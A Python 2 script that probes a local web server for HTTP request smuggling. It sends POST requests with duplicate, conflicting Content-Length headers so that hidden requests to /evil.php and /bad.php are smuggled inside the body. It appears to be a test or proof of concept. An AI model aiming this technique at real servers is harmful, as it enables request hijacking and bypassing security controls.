import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 8000))

dummyContent = "bar=1&foo=2"
badContent="badbar=5&badfoo=6"
badReq = "POST /bad.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:%d\r\n\r\n%s" % (len(badContent), badContent)
evilContent="evilbar=3&evilfoo=4"
evilReq = "POST /evil.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:%d\r\n\r\n%s" % (len(evilContent)+len(badReq), evilContent)
a = sock.send("GET /ok.php HTTP/1.1\r\nUser-Agent: Mozilla\r\nHost: 127.0.0.1\r\n\r\n")
data = sock.recv(2000)
print "1", data
a = sock.send("POST /which.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:%d\r\nContent-Length:%d\r\n\r\n%s%s%s" % (len(dummyContent), len(dummyContent)+len(evilReq), dummyContent, evilReq, badReq))
data = sock.recv(2000)
print "2", data
# switch values between both headers
a = sock.send("POST /which.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:%d\r\nContent-Length:%d\r\n\r\n%s%s%s" % (len(dummyContent)+len(evilReq), len(dummyContent), dummyContent, evilReq, badReq))
data = sock.recv(2000)
print "3", data
#repetition of another header
#a = sock.send("POST /which.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Lol:%d\r\nContent-Lol:%d\r\nContent-Length:%d\r\n\r\n%s\r\n" % (len(dummyContent), len(dummyContent), len(dummyContent), dummyContent))
#simple repetition
#a = sock.send("POST /which.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length:%d\r\nContent-Length:%d\r\n\r\n%s" % (len(dummyContent), len(dummyContent), dummyContent))
a = sock.send("GET /ok2.php HTTP/1.1\r\nUser-Agent: Mozilla\r\nHost: 127.0.0.1\r\n\r\n")
data = sock.recv(2000)
print "4", data

sock.close()
